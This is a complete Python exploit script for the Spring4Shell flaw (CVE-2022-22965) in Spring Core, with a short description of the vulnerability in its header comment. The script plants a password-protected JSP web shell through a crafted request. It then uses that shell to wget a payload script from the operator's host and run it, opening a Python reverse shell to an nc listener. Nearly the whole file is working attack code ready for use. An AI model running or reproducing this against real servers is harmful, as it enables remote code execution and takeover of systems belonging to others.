#!/usr/bin/env python3
#  -*- coding: utf-8 -*- #######################################################################################
#   ▄▄▄▄▄   █ ▄▄  █▄▄▄▄ ▄█    ▄     ▄▀    ▄▄▄▄▄    ▄  █ ▄███▄   █    █                                         #
#  █     ▀▄ █   █ █  ▄▀ ██     █  ▄▀     █     ▀▄ █   █ █▀   ▀  █    █                                         #
#▄  ▀▀▀▀▄   █▀▀▀  █▀▀▌  ██ ██   █ █ ▀▄ ▄  ▀▀▀▀▄   ██▀▀█ ██▄▄    █    █                                         #
# ▀▄▄▄▄▀    █     █  █  ▐█ █ █  █ █   █ ▀▄▄▄▄▀    █   █ █▄   ▄▀ ███▄ ███▄                                      #
#            █      █    ▐ █  █ █  ███               █  ▀███▀       ▀    ▀                                     #
#             ▀    ▀       █   ██                   ▀                                                          #                                                                                                                                                 #
#                                                                                                              #
# spring4shell - nighter@nighter.se                                                                  #
#                                                                                                              #
# DATE                                                                                                         #
# 01/04/2022                                                                                                   #
#                                                                                                              #
# DESCRIPTION                                                                                                  #
#                                                                                                              #
# CVE-2022-22965 was reported this time on the very popular Java framework Spring Core on JDK9+.               #
# A new vulnerability was found in Spring Core on JDK9+ allowing a remote code execution as previously         #
# happened for log4j and Spring cloud. This vulnerability is referenced as Spring4shell.                       #
#                                                                                                              #
# The Spring Framework is a famous open-source framework used to easily build Java applications. One of        #
# the main components is Spring Core which is one of the fundamental parts of the framework. The vulnerability #
# take advantage of an issue in this part to execute arbitrary code on the host or container.                  #
# In particular, the vulnerability affects functions that use RequestMapping annotation and                    #
# POJO (Plain Old Java Object) parameters. RequestMapping uses setter and getters for id to set and get values #
# for specific parameters.                                                                                     #
#                                                                                                              #
# Thus, compiling the project and hosting it on Tomcat, is possible to modify Tomcat logging properties.       #
# Consequently, it is possible to upload a webshell in the Tomcat root directory.                              #
#                                                                                                              #
#                                                                                                              #
################################################################################################################

import signal
import termios
import select
import socket
import os
import fcntl
import sys
import time
import requests
import base64
import http.server
import socketserver
from urllib.parse import urljoin

from multiprocessing import Process
from shutil import copyfile
import requests
import time

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print("\nYou pressed Ctrl+C!")
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)

def http_listner():
    
    PORT = 9999
    
    os.chdir('/tmp')
    Handler = http.server.SimpleHTTPRequestHandler
    
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print("[+] Serving at port: ", PORT)
        httpd.serve_forever()    


def prepare_payload():
    
    payload = '''#!/bin/sh
python -c 'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"%s\", %s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\");s.close()' ''' % (LHOST, LPORT)    

    with open('/tmp/payload.sh', 'w') as file:
        file.write(payload)  


def create_springwebshell():
    
    global URL
       
    headers = {"suffix":"%>//",
                "c1":"Runtime",
                "c2":"<%",
                "DNT":"1",
                "Content-Type":"application/x-www-form-urlencoded"

    }

    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22secret%22.equals(request.getParameter(%22pass%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/spring4shell&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="    
    
    try:
        go = requests.post(URL,headers=headers,data=data,timeout=15,allow_redirects=False, verify=False)
        shellurl = urljoin(URL, 'shell.jsp')
        shellgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=False)
        if shellgo.status_code == 200:
            print(f"[+] WebShell created: {shellurl}?pass=secret&cmd=whoami")
    except Exception as e:
        print("[+] WebShell creation failed %s" % str(e))
        os._exit(0)



def exploit():
     
    time.sleep(5)
    
    print("[+] Exploit")
    
    shellurl = urljoin(URL, 'shell.jsp')

    payload = 'wget http://%s:9999/payload.sh -O /tmp/payload.sh' % LHOST
    r=requests.get("%s?pass=secret&cmd=%s" % (shellurl, payload))
 
    time.sleep(0.5)
 
    payload = '/bin/bash /tmp/payload.sh'
    r=requests.get("%s?pass=secret&cmd=%s" % (shellurl, payload))    


if __name__ == '__main__':

    if len(sys.argv) != 4:
        print ("""
   ▄▄▄▄▄   █ ▄▄  █▄▄▄▄ ▄█    ▄     ▄▀    ▄▄▄▄▄    ▄  █ ▄███▄   █    █     
  █     ▀▄ █   █ █  ▄▀ ██     █  ▄▀     █     ▀▄ █   █ █▀   ▀  █    █     
▄  ▀▀▀▀▄   █▀▀▀  █▀▀▌  ██ ██   █ █ ▀▄ ▄  ▀▀▀▀▄   ██▀▀█ ██▄▄    █    █     
 ▀▄▄▄▄▀    █     █  █  ▐█ █ █  █ █   █ ▀▄▄▄▄▀    █   █ █▄   ▄▀ ███▄ ███▄  
            █      █    ▐ █  █ █  ███               █  ▀███▀       ▀    ▀ 
             ▀    ▀       █   ██                   ▀                      
                                                                          
[nighter@nighter.se]
    """)
        print("Usage: %s <URL> <LHOST> <LPORT>" % (sys.argv[0]))
        print("EXAMPLE: ./spring4shell.py 'http://127.0.0.1:8000/spring4shell/greeting' 127.0.0.1 7777\n")
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    print("[+] LHOST: %s" % LHOST)

    prepare_payload()
    create_springwebshell()

    p = Process(target=http_listner)
    p.start()

    # Run ldap server async
    p = Process(target=exploit)
    p.start()

    # Start listener
    print("[+] Shell listen")
    os.system('nc -lnvp %s' % str(LPORT))
    #os.system('socat file:`tty`,raw,echo=0 tcp-listen:%s' % str(LPORT))
